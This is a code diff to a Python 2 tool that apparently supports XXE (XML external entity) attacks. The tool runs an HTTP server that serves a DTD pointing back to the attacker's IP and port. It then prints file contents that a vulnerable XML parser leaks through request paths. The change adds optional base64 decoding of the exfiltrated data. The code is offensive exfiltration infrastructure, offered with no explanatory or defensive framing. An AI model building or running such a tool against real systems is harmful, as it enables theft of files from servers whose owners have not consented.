@@ -14,13 +14,14 @@ DTD_TEMPLATE = """
 
 LAST_CONTENTS = ''
 
-def makeCustomHandlerClass(dtd_name, dtd_contents):
+def makeCustomHandlerClass(dtd_name, dtd_contents, isb64):
     '''class factory method for injecting custom args into handler class. 
     see here for more info: http://stackoverflow.com/questions/21631799/how-can-i-pass-parameters-to-a-requesthandler'''
     class xxeHandler(BaseHTTPRequestHandler, object):
         def __init__(self, *args, **kwargs):
             self.DTD_NAME = dtd_name
             self.DTD_CONTENTS = dtd_contents
+            self.ISB64 = isb64
             super(xxeHandler, self).__init__(*args, **kwargs)
             
         def log_message(self, format, *args):
@@ -40,7 +41,7 @@ def makeCustomHandlerClass(dtd_name, dtd_contents):
                     contents = self.path[2:]
                 else:
                     contents = self.path
-                displayContents(contents)
+                displayContents(contents, self.ISB64)
                 self.send_response(200)
                 self.end_headers()
                 self.wfile.write("") #have to respond w/ something so it doesnt timeout
@@ -60,17 +61,17 @@ def displayContents(contents, isBase64=False):
         print "[+] Received response, displaying\n"
         if not isBase64:
             print urllib.unquote(contents)
-            LAST_CONTENTS = newContents
         else:
             print urllib.unquote(contents).decode('base64')
+        LAST_CONTENTS = newContents
         print "------\n"
     return
     
   
-def startServer(ip, port=8000):
+def startServer(ip, port=8000, isb64=False):
     try:
         DTD_CONTENTS = DTD_TEMPLATE.format(ip, port)
-        xxeHandler = makeCustomHandlerClass(DTD_NAME, DTD_CONTENTS )
+        xxeHandler = makeCustomHandlerClass(DTD_NAME, DTD_CONTENTS, isb64)
         server = HTTPServer((ip, port), xxeHandler)
         #touches a file to let the other process know the server is running. super hacky
         with open('.server_started','w') as check:
